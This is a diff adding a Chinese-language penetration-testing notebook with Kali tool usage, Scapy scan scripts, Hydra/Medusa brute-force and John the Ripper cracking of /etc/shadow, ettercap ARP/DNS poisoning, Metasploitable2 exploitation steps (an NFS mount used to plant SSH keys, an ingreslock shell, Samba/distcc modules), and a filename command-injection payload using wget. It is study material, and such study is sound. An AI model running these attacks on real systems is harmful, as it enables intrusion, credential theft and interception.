+	88..desktop都在/usr/share/applications
+	89.NTML：
+用户输入账号密码，客户端会缓存输入密码的哈希值，原始密码会被丢弃（“原始密码在任何情况下都不能被缓存”）。
+客户端向服务器提交包含用户名的请求
+服务器生成随机数，称为Challenge或者Nonce，明文发回。
+客户端在收到后用密码哈希进行对称加密，发出
+服务器解密
+	90.基本HTTP身份认证是明文进行身份认证的。
+	92.web 应用在登录的时候都会进行双因素认证，除了账号密码之后还需要比如说还要插入token（银行K宝）。
+	93.CSRF 跨站伪造请求。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。双因素验证可以防止。
+	94./usr/bin/gnome-terminal shell路径。
+	95.cp xxx.tar.gz /root/Desktop 这条语句就会进行原名的拷贝
+	96.kali中sha值的计算：shasum arachni-1.4-0.5.10-linux-i686.tar.gz.sha1 
+shasum -h
+Usage: shasum [OPTION]... [FILE]...
+Print or check SHA checksums.
+With no FILE, or when FILE is -, read standard input.
+  -a, --algorithm   1 (default), 224, 256, 384, 512, 512224, 512256
+还可以直接使用sha1sum,sha224sum,sha256sum,sha384sum,sha512sum
+感觉shasum命令和tar比较像
+ 
+	97.安装linux-headers-xxxx需要有对应内核版本，所以可能需要升级内核
+	99.echo -n "xxxxxx字符串" | base64 
+	100.firebug
+Network中保持就会保持之前提交的交互过程
+	102.gem install mysql2 -v '0.3.18'安装失败，因为ruby on rails故需要安装。但是不同于网上所说，我是在找不到libmysql-ruby于kali的源中，只安装了libmysqlclient-dev，但是发现已经可以成功执行此命令了。
+	105.
+nmap主机发现：发送ICMP ECHO/TIMESTAMP/NETMASK报文、发送TCP SYN/ACK包、发送SCTP INIT/COOKIE-ECHO包，用户可以在不同的条件下灵活选用不同的方式来探测目标机。
+	106.raspberry pi 3连上路由器，但是没有在路由器的控制台里面找到。。。其ip。于是用了netdiscover -r 进行遍历搜索，顺便还通过MAC Vendor / Hostname来判断出来哪个ip对应那个设备。
+root@kali:~# netdiscover -r 192.168.2.2/24
+
+ Currently scanning: Finished!   |   Screen View: Unique Hosts                 
+                                                                               
+ 50 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 3000             
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.1.30    b8:27:eb:1c:b8:7e     41    2460  Raspberry Pi Foundation     
+ 192.168.2.1     cc:81:da:ad:e3:29      1      60  Unknown vendor              
+ 192.168.2.145   98:e7:f5:01:44:74      3     180  HUAWEI TECHNOLOGIES CO.,LTD 
+ 192.168.2.175   98:e7:f5:16:85:c6      3     180  HUAWEI TECHNOLOGIES CO.,LTD 
+ 192.168.2.218   84:ef:18:e5:3e:95      1      60  Unknown vendor              
+ 192.168.2.228   50:b7:c3:55:69:a3      1      60  Samsung Electronics CO., LTD
+
+root@kali:~# nmap -sn 192.168.2.1/24
+Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-02-08 11:00 EST
+Nmap scan report for phicomm.me (192.168.2.1)
+Host is up (0.015s latency).
+MAC Address: CC:81:DA:AD:E3:29 (Unknown)
+Nmap scan report for HUAWEI_Mate_8.lan (192.168.2.145)
+Host is up (0.011s latency).
+MAC Address: 98:E7:F5:01:44:74 (Unknown)
+Nmap scan report for 192.168.2.175
+Host is up (0.073s latency).
+MAC Address: 98:E7:F5:16:85:C6 (Unknown)
+Nmap scan report for LAPTOP-2MH9QMLA.lan (192.168.2.218)
+Host is up (0.022s latency).
+MAC Address: 84:EF:18:E5:3E:95 (Unknown)
+Nmap scan report for SC-201609232141.lan (192.168.2.228)
+Host is up (0.00020s latency).
+MAC Address: 50:B7:C3:55:69:A3 (Samsung Electronics)
+Nmap scan report for kali.lan (192.168.2.105)
+Host is up.
+Nmap done: 256 IP addresses (6 hosts up) scanned in 2.06 seconds
+
+可以比较下结果。。。虽然nmap快很多。。但是怎么有两个IP Unkonw。
+	107.Xshell和dropbear类似，这是一款轻量级ssh服务器
+	108.Linux下有一个定时运行的程序命令叫“crontab”，之前对付K2有个版本不允许ssh，可以用来每一次刚刚启动的时候就杀死K2的阻止进程。
+	110.扫描 on tcp:
+tcp扫描：
+-->SYN+PORT
+<--SA
+--->AR  #means port is open
+如果是SYN扫描，就是最后发的包仅仅是R
+
+TCP 圣诞树(Xmas Tree)扫描：
+--->PSH、FIN、URG+PORT
+<--- no response #this means port is open
+<--- R  #this means port is closed
+<---- ICMP ERROR(Type 3,Code 1,2,3,9,10 or 13) #this means port is filtered
+#! /usr/bin/python
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+from scapy.all import *
+
+dst_ip = "10.0.0.1"
+src_port = RandShort()
+dst_port=80
+
+xmas_scan_resp = sr1(IP(dst=dst_ip)/TCP(dport=dst_port,flags="FPU"),timeout=10)
+if (str(type(xmas_scan_resp))==""):
+    print "Open|Filtered"
+elif(xmas_scan_resp.haslayer(TCP)):
+    if(xmas_scan_resp.getlayer(TCP).flags == 0x14):
+        print "Closed"
+elif(xmas_scan_resp.haslayer(ICMP)):
+    if(int(xmas_scan_resp.getlayer(ICMP).type)==3 and int(xmas_scan_resp.getlayer(ICMP).code) in [1,2,3,9,10,13]):
+        print "Filtered"
+
+FIN扫描:
+--->FIN+port
+<--- No response #this means port is open
+<--- R  #this means port is closed
+<---- ICMP ERROR(Type 3,Code 1,2,3,9,10 or 13) #this means port is filtered
+
+TCP 空扫描(Null):
+--->No flag+PORT
+<---No response #this means port is open
+<--- R  #this means port is closed
+<---- ICMP ERROR(Type 3,Code 1,2,3,9,10 or 13) #this means port is filtered
+
+TCP ACK扫描:
+--->A+port
+<--- R #this means port is unfiltered
+<---- ICMP ERROR(Type 3,Code 1,2,3,9,10 or 13) #this means port is filtered
+<---- No response #this means port is filtered
+<----R +positive window size #port is open
+<----R +zero window size #port is closed
+#! /usr/bin/python
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+from scapy.all import *
+
+dst_ip = "10.0.0.1"
+src_port = RandShort()
+dst_port=80
+
+window_scan_resp = sr1(IP(dst=dst_ip)/TCP(dport=dst_port,flags="A"),timeout=10)
+if (str(type(window_scan_resp))==""):
+    print "No response"
+elif(window_scan_resp.haslayer(TCP)):
+    if(window_scan_resp.getlayer(TCP).window == 0):
+        print "Closed"
+    elif(window_scan_resp.getlayer(TCP).window > 0):
+        print "Open"
+
+	111.扫描 on udp：
+<---UDP packet #port is open
+<---no response #open or filtered
+<---ICMP ERROR(Type 3,Code 3) #port is closed
+<---ICMP ERROR(Type 3,Code 1,2,9,10 or 13) #port is filtered
+#! /usr/bin/python
+
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+from scapy.all import *
+
+dst_ip = "10.0.0.1"
+src_port = RandShort()
+dst_port=53
+dst_timeout=10
+
+def udp_scan(dst_ip,dst_port,dst_timeout):
+    udp_scan_resp = sr1(IP(dst=dst_ip)/UDP(dport=dst_port),timeout=dst_timeout)
+    if (str(type(udp_scan_resp))==""):
+        retrans = []
+        for count in range(0,3):
+            retrans.append(sr1(IP(dst=dst_ip)/UDP(dport=dst_port),timeout=dst_timeout))
+        for item in retrans:
+            if (str(type(item))!=""):                udp_scan(dst_ip,dst_port,dst_timeout)
+        return "Open|Filtered"
+    elif (udp_scan_resp.haslayer(UDP)):
+        return "Open"
+    elif(udp_scan_resp.haslayer(ICMP)):
+        if(int(udp_scan_resp.getlayer(ICMP).type)==3 and int(udp_scan_resp.getlayer(ICMP).code)==3):
+            return "Closed"
+        elif(int(udp_scan_resp.getlayer(ICMP).type)==3 and int(udp_scan_resp.getlayer(ICMP).code) in [1,2,9,10,13]):
+            return "Filtered"
+
+print udp_scan(dst_ip,dst_port,dst_timeout)
+
+haslayer()：查找指定层：TCP或UDP或ICMP
+getlayer()：获
+取指定层：TCP或UDP或ICMP
+	112.如何添加自定义命令：
+alias 命令和他英文的意思一样，“别名”。
+
+比如我们要添加ll = ls -l
+那么就在上述脚本中加上一句：
+alias ll="ls -l"
+
+那么快速清理Shell的命令历史记录，本人自己起的别名叫clean：
+alias clean="history -c ; history -w"
+	113.添加自己的程序作为命令
+export PATH=路径:$PATH
+但是这么做的缺点是关闭Shell后添加的路径立即失效。
+/home/username/.profile 做到开机就执行命令
+或者
+sh xxxx.sh #引入一个shell脚本，然后在脚本中执行export
+
+将我们创建的用户添加到sudo用户组。（这样我们创建的用户才能进行安装软件，允许打印。使用特权模式等操作。不然我们创建的用户就只能进行浏览。没有实际意义）
+输入：usermod -a -G sudo username1
+
+将用户的默认外壳改为bash：
+chsh -s /bin/bahs username1
+否则按Tab就只是Tab，就是相当于不是在bash里面。前面的符号只有一个提示符$
+	115.
+root@kali:~/test# su li
+li@kali:/root/test$ exit
+exit
+root@kali:~/test# 
+	116.允不允许被find也和权限有关系。
+	117.kali倒是可以自动与路由器交互，所以VM设置桥接以后就有网了。但是Ubuntu需要设置好一个Ethenet连接
+	118.注意：wget获取https的时候要加上：--no-check-certificate
+	119./usr/share/images/desktop-base 壁纸
+	120.nohup Command [ Arg ... ] [　& ] 　　
+描述：nohup 命令运行由 Command 参数和任何相关的 Arg 参数指定的命令，忽略所有挂断（SIGHUP）信号。在注销后使用 nohup 命令运行后台中的程序。要运行后台中的 nohup 命令，添加 & （ 表示“and”的符号）到命令的尾部。 　　
+如果不将 nohup 命令的输出重定向，输出将附加到当前目录的 nohup.out 文件中。如果当前目录的 nohup.out 文件不可写，输出重定向到 $HOME/nohup.out 文件中。如果没有文件能创建或打开以用于追加，那么 Command 参数指定的命令不可调用。如果标准错误是一个终端，那么把指定的命令写给标准错误的所有输出作为标准输出重定向到相同的文件描述符。 
+
+Unix/Linux下一般比如想让某个程序在后台运行，很多都是使用 & 在程序结尾来让程序自动运行。比如我们要运行mysql在后台：
+/usr/local/mysql/bin/mysqld_safe --user=mysql &但是加入我们很多程序并不象mysqld一样做成守护进程，那么就使用nohup：
+nohup /root/test.php &
+	122.chroot，即 change rootdirectory （更改 root 目录）。例如，在 linux 系统中，系统默认的目录结构都是以 `/`，即是以根（root）开始的。而在使用 chroot 之后，系统的目录结构将以指定的位置作为 `/` 位置。
+不幸的是，在最新的固件（V01.07.0090）中，ftp访问无人机的root是被chroot的，此外，Telnet 和SSH访问也都是被禁用的。通过chroot结合权限来防御。
+	123.经过我对二进制文件的简单分析发现，在“openvpn_cgi”二进制文件中，存有一个可利用字段。该字段会对上传文件的扩展名进行判断，如果文件扩展名为.zip，它则会尝试通过将其直接传递到命令行来解压缩。
+那么，是否我们可以通过利用一个伪造的.zip文件，来让其执行我们的注入命令呢？答案是肯定的。例如我们可以这样来命名文件：“x.zip \’; wget example.com; echo’”，此时让我们来查看下/tmp/openvpn_upload文件夹，可以看到example.com的主页已经被成功下载到了该目录
+	124.ip查询：
+tell-me-ip.com 不过只能查到当前访问者的。可以把自己的网站做个透明代理转发，然后拦截
+ip.cn
+ip123.com
+ip138.com
+
+http://ipinfo.io/  ：	AS4538 121.48.192.0/19  支持IPv6
+curl ipinfo.io会直接得到json数据，因为识别了User-Agent。
+http://ipinfo.io/json 这是Browser版json
+curl ipinfo.io/8.8.8.8
+http://ipinfo.io/8.8.8.8/json
+
+http://ip-api.com/json
+http://ip-api.com/json/208.80.152.201
+
+http://ip.taobao.com/service/getIpInfo.php?ip=121.48.207.129 可以查出来是教育网
+
+我发现我的ISP查起来是Sichuan University这个可是个不错的定位
+
+网站备案：http://icp.chinaz.com/hellovega.cn
+如果数据没有收录你需要填一个验证码他会获取最新信息
+http://www.miitbeian.gov.cn/publish/query/indexFirst.action 坑爹，验证码我帮他输了。。。，不过这个比较容易出现业务繁忙而被挡在外面。记住对于个人网站，主办单位名称就是个人姓名
+
+
+怕是醉了：
+    电信宽带
+    联通宽带
+    移动宽带
+    教育网
+    铁通宽带
+    网通宽带
+    长城宽带
+    中科网宽带
+    广电宽带
+    歌华宽带
+    天威宽带
+    方正宽带
+    中邦宽带
+    华数宽带
+    珠江宽带
+    油田宽带
+    视讯宽带
+    东南宽带
+    金桥网宽带
+    盈联宽带
+    华宇宽带
+    有线宽带
+
+	125.刚刚进路由器调了一下，发现PandoraBox默认主机名会暴露系统及其版本，而且NTP客户端以及服务器居然开着。使用的ssh服务端是Dropbear。
+	126.ssh连接软件：
+考CCIE时候，为了迎合考场环境，耐住性子用putty。
+其他时间，windows上用xshell，mac上用iterm，linux上用PAC
+SecureCRT和XShell差不多，不过英文并收费。XShell免费版与收费版功能一样，业界良心。
+XShell支持文件传送，相当于putty+Winscap。Xshell是一个用于MS Windows平台的强大的SSH，TELNET，和RLOGIN终端仿真软件
+Ctrl+s锁定命令行，Ctrl+q即可解锁命令行
+
+工具中的几种文件传输模式：
+1）ASCII：最快的传输模式，但只能传文本
+2）Binary：只能传二进制文件
+3）Xmodem：非常古老的传输协议速度较慢，但由于使用了CRC错误侦测方法，传输的准确率可高达99.6%。
+4）Ymodem：Xmodem的改良版，速度比它快
+5）Zmodem：Zmodem采用了串流式（streaming）传输方式，传输速度较快，而且还具有自动改变区段大小和断点续传、快速错误侦测等功能。这是目前最流行的文件传输协议。
+
+rz，sz是Linux/Unix同Windows进行ZModem文件传输的命令行工具。
+优点就是不用再开一个sftp工具登录上去上传下载文件。
+sz filename：将选定的文件发送（send）到本地机器
+rz：运行该命令会弹出一个文件选择窗口，从本地选择文件上传到Linux服务器
+
+xftp是一个基于 MS windows 平台的功能强大的SFTP、FTP 文件传输软件。
+	127.curl -X method
+	128.sogou:
+apt-get install software-properties-common #才有add-apt-repository
+add-apt-repository ppa:fcitx-team/nightly #但是没有找到kali-rolling版本，报错
+
+反正我使用了apt install -f来修复所缺的依赖。
+现在apt-get都可以用apt代替。
+	129.原来专门存在反黑客组织与他们的网站。也希望获得人们（站长们的）捐赠。
+	130.grep -Fx 'xxx' -F是使用正则，-x 进行完全匹配（所有有么有-F一样）
+	45.ike-scan - Discover and fingerprint IKE hosts (IPsec VPN servers)
+	131.Custom Kali Image定制kali镜像
+apt-get install git live-build cdebootstrap
+git clone git://git.kali.org/live-build-config.git
+cd live-build-config
+./build.sh --distribution kali-rolling --verbose
+	132.linux下开机启动脚本：
+/etc/rc.local
+/etc/rc.sysinit
+/etc/inittab
+/etc/profile
+查看开机启动服务：ls /etc/rc.d
+　　K开头代表这个启动级别需要停止的服务，编号是停止的时候执行的顺序，再后面就是服务明了。
+　　S开头则是要启动那些服务。
+chkconfig --list
+	132.wireshark需要root账户打开。否则没有网卡监听权限，选项里也就没有网卡。 
+	133.kali下的/etc/rc.local不会被开机执行，所以你需要把这个local ln到/etc/init.d/然后设置开机启动脚本那样来设置它。
+	134.Hydra
+-l -L指username
+-p -P 指定password
+-M FILE   list of servers to attack, one entry per line, ':' to specify port
+-e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
+-f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
+-t TASKS  run TASKS number of connects in parallel (per host, default: 16)
+-s PORT
+-V -vV
+  hydra -l root -P pawword.txt ssh://xxx.xxx.xx.x
+  hydra -l user -P passlist.txt ftp://192.168.0.1
+  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
+  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
+  hydra -l admin -p password ftp://[192.168.0.0/24]/
+  hydra -L logins.txt -P pws.txt -M targets.txt ssh
+  hydra -l administrator -P pass.txt 10.36.16.18 smb
+Supported services: asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp redis rexec rlogin rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
+我见到过的基本都是可以爆破了。
+hydra 223.129.64.1 -s 23 -l Alphanetworks -P ~/Desktop/telnet_pass.txt telnet -f -V -e ns #-V是显示中间所尝试的账号密码组合
+爆破telnet的时候导致telnet服务失效，我自己在爆破期间连接会出现
+Trying 223.129.64.1...
+Connected to 223.129.64.1.
+Escape character is '^]'.
+Connection closed by foreign host. 所以爆破的结果也是很让人无语的出错。不过msf里面的auxiliary/scanner/telnet/telnet_login很稳。
+	134.5 Medusa  和Hydra一样的多场景使用爆破工具
+http://www.cnblogs.com/Te7m/p/5938441.html
+	-M 指定爆破模式
+		
+	135.brute：
+kali的字典在/usr/share/wordlists下面，其中的Rockyou来自一次密码泄露。
+生成个人字典cupp.py（github上专门生成定制字典的py） 使用-i参数，不建议这样，应该基于已经暴露的密码进行记录。撞库。
+medusa -h target_ip -u username(-U usernameList) -p path_to_password_directory -M authenticatiion_service_to_attack
+	136.John the Ripper:JtR
+本地管理员的密码很可能与域管理员密码一致
+john会自己猜测密码类型，但是最好你使用--format=xxx来指定类型。
+
+注意版本来支持更多的破解类型
+
+1)John支持四种密码破解模式：（选择什么作为破解密码的候选项）
+字典模式：在这种模式下，用户只需要提供字典和密码列表用于破解。
+单一破解模式：这是john作者推荐的首选模式。John会使用登录名、全名和家庭通讯录作为候选密码。
+递增模式：在该模式下john会尝试所有可能的密码组合。这是最具威力的一种。
+外部模式：在这种模式下，用户可以使用john的外部破解模式。使用之前，需要创建一个名为（list.external:mode）的配置文件，其中mode有用户分配。
+
+John the Ripper自带了一个功能，它可以将shadow和passwd文件结合在一起，这样就可以使用该工具破解Linux系统的用户密码。本小节将介绍破解Linux用户密码的方法。
+使用John the Ripper工具破解Linux用户密码。具体操作步骤如下所示。
+（1）使用unshadow提取密码散列。执行命令如下所示：
+root@kali:~# unshadow /etc/passwd /etc/shadow > /tmp/linux_hashes.txt
+执行以上命令后，会将/etc/passwd/文件与/etc/shadow/文件结合在一起，生成一个叫做linux_hashes.txt的文件，保存在/tmp/目录中。
+（2）破解Linux用户密码。执行命令如下所示：   John也哟GUI，可以使用GUI。
+root@kali:~# john --format=crypt --show /tmp/linux_hashes.txt
+root:123456:0:0:root:/root:/bin/bash
+bob:123456:1000:1001::/home/bob:/bin/sh
+alice:123456:1001:1002::/home/alice:/bin/sh
+3 password hashes cracked, 0 left
+从输出的结果中，可以看到当前系统中共有三个用户，其密码都为123456。
+
+
+	136.5  crunch：一般密码字典应该随身携带，使用这个程序的时候说明是不得已
+/usr/share/crunch/charset.lst 这个文件里面存放的是<charset string>的配置，比如：
+hex-lower                     = [0123456789abcdef]
+crunch <min-len> <max-len> [<charset string>] [options]
+crunch 1 6 abcdefg\    #生成 最小为1,最大为6.由abcdefg和空格为元素的所有组合（/代表空格）
+crunch 1 8 -f charset.lst mixalpha-numeric-all-space -o wordlist.txt #mixalpha-numeric-all-space项目包含最常见的元素组合（即大小写字母+数字+常见符号）
+-t @,%^
+              Specifies  a pattern, eg: @@god@@@@ where the only the @'s, ,'s,
+              %'s, and ^'s will change.
+              @ will insert lower case characters
+              , will insert upper case characters
+              % will insert numbers
+              ^ will insert symbols
+root@kali:~/Desktop# crunch 12 12 -t ,@@@@@@@@%%% -o /root/wordlist.txt
+Crunch will now generate the following amount of data: 70583547826688000 bytes
+67313716723 MB
+65736051 GB
+64195 TB
+62 PB
+告诉完会生成的大小以后就开始生成字典了
+
+
+	136.6 自己进行彩虹表破解:
+rtgen.exe:彩虹表生成器，生成口令、散列值对照表。产生的文件名与你输入的具体参数数值有关系
+rtsort.exe:排序彩虹表，为rcrack.exe提供输入。后面直接加上rtgen.exe自动生成的文件就好
+rcrack.exe:使用排好序的彩虹表进行口令破解。
+一般使用不过还是自带彩虹表的一体化工具或者是在线破解网站
+
+彩虹表生成器（rtgen.exe）生成自己的彩虹表。其命令行格式为：
+rtgen hash_algorithm charset plaintext_len_min plaintext_len_max table_index chain_len chain_num part_index
+参数取值含义：
+Hash_algorithmlm, md5, sha1散列算法，其中lm表示LANMAN，为Windows口令的散列方法
+plain_charsetalpha, alphanumeric, alphanumeric- symbol14, all, numeric, loweralpha, lower-alphanumeric1明文所用字符集，使用byte表示将256个字符全作为字符集
+plain_len_min明文的最小长度
+plain_len_max明文的最大长度
+rainbow_table_index彩虹表的索引
+rainbow_chain_length彩虹链长度
+rainbow_chain_count要生成彩虹链（每条哈希值可逆向产生一个密码长链（多个密码））的个数
+file_title_suffix字符串注释-添加到文件标题后面的字符串
+-bench-bench测试选项，用于性能测试
+
+	136.8 kali live提供的工具就是chntpw（-i来启动交互模式）:
+chntpw -i /mnt/xxx/.../SAM（-i 与程序交互）    操作需谨慎，最好先备份
+一开始进入live模式下，桌面上会有几个透明的盘，双击就会挂载到/media/root。但是都是Read-Only System。
+对散列的破解都是碰撞，因为散列从技术上实现了不可逆。每秒破解次数c/s。
+如果散列是在本地计算并发送的，那么就可以重放攻击。
+
+挂载的时候需要按照读写权限挂载：  mount -t ntfs -o rw /dev/sda1 /sda
+如果遇到下面的问题就进入windows关机一次，在重新挂载
+	Windows is hibernated, refused to mount.
+	Failed to mount '/dev/sda1': Operation not permitted
+	The NTFS partition is in an unsafe state. Please resume and shutdown
+	Windows fully (no hibernation or fast restarting), or mount the volume
+	read-only with the 'ro' mount option.
+win10下面已经不能添加用户到指定的Group了，但是可以清空密码课开启Administrator（默认运行都是管理员权限开启）、DefaultAccount、Guest。但是怎么进去的时候windows需要重新初始化，就像刚装完系统一样一直等着。
+没有找到原来账户。
+	137.mac地址表的耗尽：
+macof -i eth0 -s 源地址 -d 攻击目标
+好像还记录了端口xx.x.x.xx.49543这样，并不是想象中伪造一堆不同MAC。。。。
+	138.Armitage：
+漏洞利用的机关枪
+systemctl start postgresql(Metasploit服务他会自己帮你开)
+连接都是127.0.0.1:55553，账号msf，密码test。
+	139.
+Hydra的使用（特别注意定时timing的参数），RainbowCrack，Medusa的使用
+Ettercap中间人攻击工具
+精通Python与Ruby
+setoolkit (Fast-Track的使用)社工攻击
+Google DOCS
+webscarab 自动监听8008端口，类似于BP
+hashcat, advanced password recovery
+后门学习：Netbus、Back Orifice、Subseven
+	140.在线密码破解：
+Medusa -h target_ip -u username -P path_to_password_dictionary -M authentication_service_to_attack指定攻击服务
+-U 后面指定用户名文件路径
+	141.病毒检测平台：
+VirusTotal
+	152.rlogin
+TCP端口512,513和514，在系统中被错误配置从而允许远程访问者从任何地方访问，这一点可以从netstat -pantu中看出来监听地址是0.0.0.0:*
+rlogin -l msfadmin 192.168.1.152 #-l 来指定user
+-p指定端口
+如果本机没哟安装rlogin就会自动转用ssh
+	153.网络文件系统（NFS)
+NFS服务器的设定可以通过/etc/exports这个文件进行，设定格式如下：
+分享目录      主机名称或者IP(参数1，参数2）
+/arm2410s   10.22.22.*(rw,sync,no_root_squash)
+Metasploitable里面因为错误的设定导致可以直接被挂载。
+
+apt install nfs-common亦会选中安装依赖包与rpcbind
+之后就可以使用：
+rpcinfo： report RPC information
+    rpcinfo -p 192.168.1.152
+    program vers proto   port  service
+    100000    2   tcp    111  portmapper
+    100000    2   udp    111  portmapper
+    100024    1   udp  58214  status
+    100024    1   tcp  39208  status
+    100003    2   udp   2049  nfs
+    100003    3   udp   2049  nfs
+    100003    4   udp   2049  nfs
+    100021    1   udp  37091  nlockmgr
+    100021    3   udp  37091  nlockmgr
+    100021    4   udp  37091  nlockmgr
+    100003    2   tcp   2049  nfs
+    100003    3   tcp   2049  nfs
+    100003    4   tcp   2049  nfs
+    100021    1   tcp  37353  nlockmgr
+    100021    3   tcp  37353  nlockmgr
+    100021    4   tcp  37353  nlockmgr
+    100005    1   udp  41457  mountd
+    100005    1   tcp  53900  mountd
+    100005    2   udp  41457  mountd
+    100005    2   tcp  53900  mountd
+    100005    3   udp  41457  mountd
+    100005    3   tcp  53900  mountd
+
+showmount: show mount information for an NFS server
+    root@kali:~# showmount -e 192.168.1.152
+    Export list for 192.168.1.152:
+    / *
+配置文件中的设备十分傻逼，直接  /   *(rw,sync,no_root_squash,no_subtree_check)
+真正应该是这样 /home/david 192.168.1.0/24(rw)
+
+ssh-keygen  #创建一个新的SSH秘钥，是交互模式的，默认选择是~/.ssh/id_rsa.pub    产生的randomart image 会随着时间变化而变化，基本不用担心被破解，randomart image是 OpenSSH 5.1 引入的一种简单的识别指纹 (fingerprint) 的图像。 
+mkdir /tmp/root
+mount -t nfs 192.168.99.131:/ /tmp/root/#需要先进行showmount -e来得知NFS server export list。不过我重启计算机以后可以直接使用这条命令
+#我使用mount命令对将远程计算机的 分区挂在到某一个终端正在的目录，然后在那个终端中直接ls没有任何显示，但是退回到父目录以后再进去就能看到有显示了。而且目录下的原来的文件被隐藏。
+cat ~/.ssh/id_rsa.pub >> /tmp/root/root/.ssh/authorized_keys  #之后就可以免除认证来进行登录了
+umount /tmp/root
+ssh root@ip 或者直接ssh ip然后自己输入用户名与密码
+
+使用ssh需要注意/xxxuser/.ssh/authorized_keys中的内容
+ssh-keyscan 用于搜集主机的公钥
+
+	154.ingreslock
+这个古老而危险的服务，我们直接telnet它的端口，默认是1524。简直就是一个后门
+telnet 192.168.1.152 1524 #ssh没用
+nc -nv 192.168.1.152 -p 1524也行
+然后获得了一个shell，对于Metasploitable2 倒是root
+	155.在Metasploitable2 的6667端口上运行着特殊版本UnreaIRCD IRC的守护进程。通过在一个系统命令后面添加两个字母”AB“发送给被攻击服务器任意一个监听该端口来触发。msf中有exploit/unix/irc/unreal_ircd_3281_backdoor可直接利用
+	156.distccd。这个Unix程序可以使大量代码在网络服务器上进行分布式编译。问题是攻击者可以滥用它来实现一些他们想运行的命令
+use exploit/unix/misc/distcc_exec 直接search这个名字就好。#attack any system running distccd
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon) 守护进程权限，比0号root低，不能用cat /etc/shadow
+	157.samba，当配置为文件权限可写同时"wide links" 被允许（默认就是允许），同样可以被作为后门
+Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。可以访问windows发布的文件共享。
+wide links：设置是否允许共享外连接。如某共享资源内有个连接指向非共享资源的文件或目录，如果设置wide links = yes将使该连接可用，如果设置wide links = no将使该连接不可用。
+root@kali:~# smbclient -L //192.168.1.152
+WARNING: The "syslog" option is deprecated
+Enter root's password:     #密码为空 相当于guest访问
+Anonymous login successful
+Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	tmp             Disk      oh noes!   #就凭借这一点信息不能够判断出来是wide link
+	opt             Disk      
+	IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+	ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+	配置文件/etc/samba/smb.conf 中的 配置：
+		[tmp]
+			comment =oh notes!
+			read only =no
+			locking =no
+			path =/tmp
+			guest ok =yes
+	
+再
+msf > use auxiliary/admin/smb/samba_symlink_traversal 
+msf  auxiliary(samba_symlink_traversal) > set RHOST 192.168.99.131
+msf  auxiliary(samba_symlink_traversal) > set SMBSHARE tmp
+msf  auxiliary(samba_symlink_traversal) > exploit （当然run也可以）
+.....
+msf  auxiliary(samba_symlink_traversal) > exit
+最后
+root@ubuntu:~# smbclient //192.168.1.152/tmp
+root@kali:~# smbclient //192.168.1.152/tmp
+WARNING: The "syslog" option is deprecated
+Enter root's password: 
+Anonymous login successful
+Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
+smb: \>
+我一开始使用//192.168.1.152/opt，但是最后smbclient的时候被拒绝访问了，提示是NT_STATUS_ACCESS_DENIED。而密码输错的话（不为空），提示是NT_STATUS_LOGON_FAILURE。所以说明对于opt目录漏洞是利用了，但是不在访问范围内。
+tmp的comment是oh noes!（哦不）.....
+
+
+exploit/multi/samba/usermap_script #Samba versions 3.0.20 through 3.0.25rc3 when using the non-default "username map script" configuration option 满足这个要求就可以用这个模块进行免认证执行任意代码通过在用户名中加入shellcode
+
+	158.ARP毒化工具：ettercap
+修改 /use/share/ettercap/etter.dns 在其中编写DNS记录（主要是A和PTR），如果用户更改了自己的hosts文件那么DNS欺骗是无效的。不过可以ARP+特定请求拦截。
+ettercap -G
+User Interface Type:
+  -T, --text                  use text only GUI
+       -q, --quiet                 do not display packet contents（只有当嗅探到密码的时候才会显示）
+       -s, --script <CMD>          issue these commands to the GUI
+  -C, --curses                use curses GUI
+  -D, --daemon                daemonize ettercap (no GUI)
+  -G, --gtk                   use GTK+ GUI
+将网关地址添加到target2，将受害者地址添加到target1.在MITM中设置好ARP Poisoning。
+Plugins-》Manage the plugins-》激活dns_spoof，最后开启sniffing就好。
+Sniffing remote connections意味着 Ettercap 会捕获和读取所有两端之间的封包，Only poison one way在我们仅仅打算毒化客户端，而并不打算毒化网关的时（或者它拥有任何对 ARP 毒化的保护时）非常实用。
+这个工具可以改变数据包，进行DNS欺骗等等。
+
+ettercap的配置文件gedit /etc/ettercap/etter.conf
+	arp扫描相关设置：
+		arp_storm_delay 每两次之间的演示，单位ms
+	arp_poison_request设置为1，并将arp_poison_reply设置为0，变成request的poisoning方式
+	
+
+问题：
+从提示也可以看出来每次只会搜索ip最后一段中的255个主机
+即便是手动添加地址也只能是host list中的内容，如果添加额外的地址会被无视，所以如果想要在目标连接之前进行攻击，推荐使用arpspoof
+为了能让scan the host的时候出现目标地址，没准需要自己ping一波
+
+结合msf的browser_autopwn
+	158.5 mitmf 这款是我见过啊最强大的mitm框架工具，特别喜欢mitm承诺工作之后的攻击（浏览器网页注入，下载可执行文件后门注入）
+	学习网址：http://www.freebuf.com/sectool/45796.html
+	git clone https://github.com/byt3bl33d3r/MITMf.git /opt/mitmf/
+	
+
+	159.driftnet捕获网络数据包中的图片，同时支持抓取和显示音频文件，可用于捕获微信朋友圈内容
